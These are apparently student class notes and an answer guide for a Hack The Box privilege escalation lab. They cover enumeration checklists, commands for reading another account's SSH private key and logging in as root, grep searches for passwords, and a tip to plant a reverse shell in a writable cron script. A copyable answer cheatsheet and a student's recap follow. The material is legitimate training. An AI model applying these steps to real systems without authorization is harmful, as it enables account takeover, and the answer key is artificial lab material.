# Privilege Escalation — Class Notes & Exercise Guide

## Quick summary

When you first get into a machine during a CTF or penetration test, you usually start out as a low-privileged user — enough to poke around, but not enough to own the box. Privilege escalation is the process of turning that low-level foothold into full control (root on Linux, Administrator/SYSTEM on Windows).

The practical approach is simple: gather everything you can about the system, check for common misconfigurations and known vulnerabilities, and then exploit the quickest, safest path to a higher-privileged account. Use automated scripts to speed things up **only** when it’s safe to do so, and always prefer manual checks on monitored or production systems.

---

## What to look for

- **System basics**: kernel and OS version. Old kernels often have public exploits.  
- **Installed software**: outdated apps can have known CVEs.  
- **User privileges**: can the current user run `sudo`? Any SUID/SGID bits on binaries? Group memberships that matter?  
- **Scheduled tasks**: cron jobs (Linux) or scheduled tasks (Windows) that run as root/ADMIN — can you write to a file or directory they use?  
- **Exposed secrets**: config files, logs, `.bash_history`, `.ssh` files — look for passwords or private keys.  
- **SSH keys**: readable private keys allow login; writable `authorized_keys` allows you to insert your public key.  
- **Allowed binaries**: if you can run certain programs as sudo without a password, there are known techniques (GTFOBins / LOLBAS) to abuse those safely.

---

## Tools & references (keep handy offline)

- Checklists: HackTricks, PayloadsAllTheThings (great for enumerations and commands).  
- Enumeration scripts (use cautiously): LinPEAS, LinEnum, linuxprivchecker, Seatbelt, JAWS, PEASS.  
  *Tip:* these scripts are noisy and may trigger alerts — prefer manual enumeration on monitored targets.

---

## Practical cautions

- **Noisy scripts = potential alarms.** On client infrastructure or monitored labs, ask before running automated enumeration.  
- **Kernel exploits can crash systems.** Test in a lab first and get permission for anything risky.  
- **Check file permissions** after downloading keys or scripts (e.g., `chmod 600 id_rsa`) or SSH will refuse them.

---

# Class Exercise Notes & Step-by-Step Guide

Below are the exact steps and commands to complete the two prompts in your exercise. Follow them in order and copy/paste the commands where appropriate.

---

## Exercise: Prompt 1 — Move from `user1` → `user2` and read `/home/user2/flag.txt`

1. SSH into the server using the provided credentials and port:
```bash
ssh [given user]@[given ip] -p [given port number of target IP]
```

2. Once logged in, check sudo privileges:
```bash
sudo -l
```

3. If `sudo -l` shows you can become `user2` (or run commands as `user2`), switch to `user2`:
```bash
sudo -su user2
```

4. Move into their home directory, list files, and read the flag:
```bash
cd ~
ls
cat flag.txt
```

If those exact commands aren’t available, use the `sudo -l` output to see what you *are* allowed to run and hunt for a permitted binary to abuse (see GTFOBins).

---

## Exercise: Prompt 2 — From `user2` → root and read `/root/flag.txt`

**Goal:** use anything you can read (keys, credentials) or any writable locations to get root.

1. Confirm your identity and look for keys:
```bash
whoami
cat /root/.ssh/id_rsa
```
If `cat /root/.ssh/id_rsa` returns a private key, copy its contents.

2. Switch to your local terminal (a new console on your Hack The Box / local machine — not inside the `user2` shell) and create a local file `id_rsa`:
```bash
vim id_rsa
```
- Paste the private key contents from `cat /root/.ssh/id_rsa`.
- If you need to remove extra lines in vim, use visual line select: press `Shift + V`, move, then `dd`.  
  (Source: Stack Overflow — “How can I delete multiple lines in vi?”)

- To edit characters, press `i` to enter INSERT mode; press `Esc` to exit INSERT mode.  
  (Source: Tutorial — “How To Edit A File Using Vim On A Linux System”)

3. (Optional) Compare the contents locally if you saved a copy on the target (helpful in some workflows):
```bash
# e.g. from target: cat /root/.ssh/id_rsa
# local: cat id_rsa
wc id_rsa           # show word/line counts if helpful
```
(Source: https://linuxize.com/post/linux-wc-command/)

4. Harden the key permissions locally (SSH requires this):
```bash
chmod 600 id_rsa
```

5. Use the private key to SSH in as root (replace IP/port accordingly):
```bash
ssh root@[target ip] -p [port] -i id_rsa
```

6. Once you're root:
```bash
ls
cat /root/flag.txt
```

**Notes:**  
- You may not need to edit the key much — only paste and `chmod 600` are typically required.  
- If the Hack The Box workspace doesn't have a local `id_rsa` file in your current directory, you don't need to specify a path to use `-i id_rsa`. The command above assumes `id_rsa` is in your current working directory.

---

## Helpful commands you might try (and what they do)

- `pwd` — print current directory (useful sanity check).  
  (Source: howtouselinux)  
- `ls -la` — list files with permissions; find readable/writable files and SUID bits.  
- `sudo -l` — list allowed sudo commands for the user.  
- `id` — current user and group info.  
- `groups` — group memberships.  
- `cat /etc/passwd` — list users on the system.  
- `dpkg -l` (or `rpm -qa`) — installed packages on Linux.  
- `searchsploit [package|kernel version]` — look for local public exploits (if available locally).  
- `wc file` — word/line/byte counts for quick file comparisons.  
  (Source: https://linuxize.com/post/linux-wc-command/)

**Canceling a bad command:** if a command hangs or you want to abort, typical interactive methods include `Ctrl+C` (interrupt). For some shell situations there's `Shift + Z` mentioned in forums (less common); prefer `Ctrl+C`.  
(Source: Unix & Linux Stack Exchange)

---

## Quick reference workflow (one-page cheat-sheet)

1. Enumerate: `uname -a`, `cat /etc/os-release`, `id`, `groups`, `sudo -l`, `ls -la`, `ps -aux`, `crontab -l`, `ls /etc/cron*`  
2. Search for secrets: `grep -R "password" /var/www /etc 2>/dev/null`, `cat ~/.bash_history`  
3. Look for keys: `ls -la /home/*/.ssh` and `cat /home/user/.ssh/id_rsa`  
4. If you have a key, copy it to your local machine and `chmod 600 id_rsa` → `ssh -i id_rsa root@IP -p PORT`  
5. If `sudo -l` shows NOPASSWD or anything suspicious, research the binary on GTFOBins for exploitation technique.  
6. If cron runs a writable script, write your reverse shell into that script and wait for execution.

---

## Final tips

- Keep a note of every command you run and why — it helps you reproduce the path later.  
- When in doubt, Google exact kernel version + “CVE” (or use searchsploit) in your lab — many public exploits exist for older versions.  
- Never run kernel exploits against a production system without explicit permission.

---

## Appendix — exercise answer cheatsheet (copyable commands)

### Prompt 1
```bash
ssh [given user]@[given ip] -p [given port number]
sudo -l
sudo -su user2
cd ~
ls
cat flag.txt
```

### Prompt 2 (from user2)
```bash
whoami
cat /root/.ssh/id_rsa            # copy this output
# On your local / HTB console:
vim id_rsa                       # paste the copied key
# (edit with i, exit INSERT with Esc; delete lines with Shift+V and dd)
chmod 600 id_rsa
ssh root@[target ip] -p [port] -i id_rsa
ls
cat /root/flag.txt
```

---

If you'd like a compact two-column cheatsheet or a one-page printable PDF, tell me and I’ll make it next.




user2@ng-2089495-gettingstartedprivesc-owz0w-69f84d78b6-54gtt:~$ cat /root/.ssh/id_rsa

so when we got user 2 by seeing that user1 could run /bin/bash as user2, we wnet looking for the flags, then under the root there was a flag. Sinec we had acess to the id_rsa for root under the root folder, we were able to the ncopy the key onto our system, change permissions with chmod 600 like ssh likes and then use taht to log int oroot with root@<IP> -p <PORT> -i id_rsa
